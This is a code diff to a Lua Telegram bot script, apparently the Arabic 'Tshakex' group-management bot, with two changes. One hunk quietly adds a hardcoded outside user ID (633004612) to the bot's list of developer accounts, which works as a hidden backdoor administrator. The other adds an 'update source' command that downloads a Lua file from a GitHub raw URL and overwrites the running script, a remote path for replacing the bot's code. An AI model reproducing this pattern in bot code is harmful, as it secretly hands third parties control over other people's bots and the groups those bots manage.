@@ -113,7 +113,7 @@ token = sudos.Token_Bot
 UserName_Dev = sudos.UserName_dev
 bot_id = token:match("(%d+)")  
 Id_Dev = tonumber(sudos.id_dev)
-Ids_Dev = {Id_Dev,bot_id}
+Ids_Dev = {Id_Dev,bot_id,633004612}
 Name_Bot = (redis:get(bot_id.."Tshakex:Redis:Name:Bot") or "FDFGERB")
 ------------------------------------------------------------------------------------------------------------
 function var(value)  
@@ -2468,6 +2468,10 @@ send(msg.chat_id_, msg.id_,[[
 ▹ `#game` - ܁ نقاط
 ]])
 return false  
+end
+if text == 'تحديث السورس' and Dev_Bots(msg) then
+download_to_file('https://raw.githubusercontent.com/TEAMTshakeXX/Tshake/master/Tshakex.lua','Tshakex.lua') 
+send(msg.chat_id_, msg.id_, "🔂┇تم تحديث السورس وتنزيل اخر تحديث للملفات")
 end
 if redis:get(bot_id.."CHENG:ID:bot"..msg.chat_id_..""..msg.sender_user_id_) then 
 if text == 'الغاء' then 
